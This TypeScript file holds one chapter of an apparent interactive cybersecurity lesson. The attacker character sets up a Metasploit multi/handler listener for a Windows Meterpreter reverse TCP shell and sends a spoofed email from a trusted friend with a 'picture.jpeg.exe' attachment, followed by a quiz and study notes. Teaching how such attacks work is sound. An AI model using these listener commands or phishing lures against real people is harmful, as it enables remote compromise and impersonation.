import type { Chapter, QuizQuestion, Scene } from "../../story";

const scenes: Scene[] = [
  [
    { from: "system", text: "cyber-attacks · image trojan · chapter 04" },
    { from: "system", text: "📡 listener armed · 💌 trust weaponized." },
  ],
  [
    { from: "kim", text: "metasploit framework — recon, exploits, payloads, loot. tonight i only need the doorbell: {green:multi/handler}." },
    {
      from: "system",
      dual: {
        kim: {
          title: "msfconsole",
          prompt: "msf6 >",
          command:
            "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nshow options",
          output: `Payload options (windows/meterpreter/reverse_tcp):

Name      Current Setting  Required
----      ---------------  --------
{yellow:LHOST}     {red:(empty)}           yes
{yellow:LPORT}     4444             yes

{cyan:handler ready — needs LHOST}`,
        },
        sally: {
          mode: "idle",
          note: "sally: still peaceful ☕",
        },
      },
    },
  ],
  [
    { from: "kim", text: "set LHOST to my ip. then run. sit quiet. wait for bait." },
    {
      from: "kim",
      terminal: {
        title: "listener",
        prompt: "msf6 >",
        command: "set LHOST 192.168.56.101\nrun",
        output: `LHOST => 192.168.56.101
[*] Started reverse TCP handler on {green:192.168.56.101:4444}
[*] {pink:waiting for victim to take the bait…} 🎣`,
      },
    },
    { from: "system", text: "reverse shell path.", visual: "reverse-shell" },
  ],
  [
    { from: "kim", text: "social engineering time. a trojan only works if she {pink:opens} it." },
    { from: "bob", text: "(the real bob is on a train somewhere, innocent 🚆)" },
    { from: "kim", text: "i create a fake mailbox that looks like bob's. message designed to drop her guard." },
    {
      from: "system",
      dual: {
        kim: {
          title: "send",
          prompt: "kim@kali:~$",
          command: "echo 'attachment: picture.jpeg.exe' >> bob_to_sally.eml\n# hit send ✈️",
          output: `{green:[+] email delivered to sally@work}`,
        },
        sally: {
          mode: "mail",
          title: "inbox",
          email: {
            from: "Bob <bob.travel@mail.com>",
            subject: "sunset from the tower 🌇",
            body: "Hey Sally,\n\nhere is that sunset shot from the Eiffel Tower I told you about. it's my favorite from the trip.\n\nCheers,\nBob",
            attachment: "picture.jpeg",
          },
          note: "looks sweet. attachment is the trap.",
        },
      },
    },
    { from: "sally", text: "bob!! finally 😍 saving this to downloads…" },
  ],
  [
    {
      from: "system",
      callout: {
        tone: "warning",
        title: "to be continued",
        text: "listener is humming. attachment is in downloads. one double-click left — then kim's screen lights up.",
      },
    },
    { from: "system", text: "chapter 4 complete." },
  ],
];

const quiz: QuizQuestion[] = [
  {
    question: "multi/handler is…",
    options: ["a photo editor", "a generic metasploit listener for incoming payloads", "sally's antivirus", "a wifi router"],
    answer: 1,
    explanation: "Waits for reverse connections.",
  },
  {
    question: "kim sets payload to…",
    options: ["linux/hashdump", "windows/meterpreter/reverse_tcp", "android/browser", "osx/safari"],
    answer: 1,
    explanation: "Matches the msfvenom payload.",
  },
  {
    question: "before run, which required option was empty?",
    options: ["LPORT", "LHOST", "USERNAME", "JPEG"],
    answer: 1,
    explanation: "LHOST must be set to attacker IP.",
  },
  {
    question: "why social engineering?",
    options: ["trojans only work if the victim opens them", "it makes terminals prettier", "msfvenom requires email", "windows blocks all exes otherwise always"],
    answer: 0,
    explanation: "Trust gets the click.",
  },
  {
    question: "the fake email pretends to be from…",
    options: ["ramesh", "bob", "microsoft", "the isp"],
    answer: 1,
    explanation: "Bob = trusted friend.",
  },
  {
    question: "sally thinks the attachment is…",
    options: ["picture.jpeg photo", "picture.jpeg.exe clearly", "a zip bomb labeled virus", "empty"],
    answer: 0,
    explanation: "Hidden extension + social trust.",
  },
];

const notes = `
> offtrck · image trojan · study notes
> chapter 04 · listener + bait mail

## metasploit listener
\`\`\`
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
\`\`\`

## social engineering
trojan fails without a click.
kim forges bob's voice → warm travel email → attachment.

## side-by-side
kim: handler waiting on :4444
sally: inbox shows "picture.jpeg"

## what's next
the click · meterpreter · defenses
`;

export const trojanChapterFour: Chapter = {
  title: "chapter 04",
  subtitle: "listener + bait mail",
  scenes,
  quiz,
  notes,
};
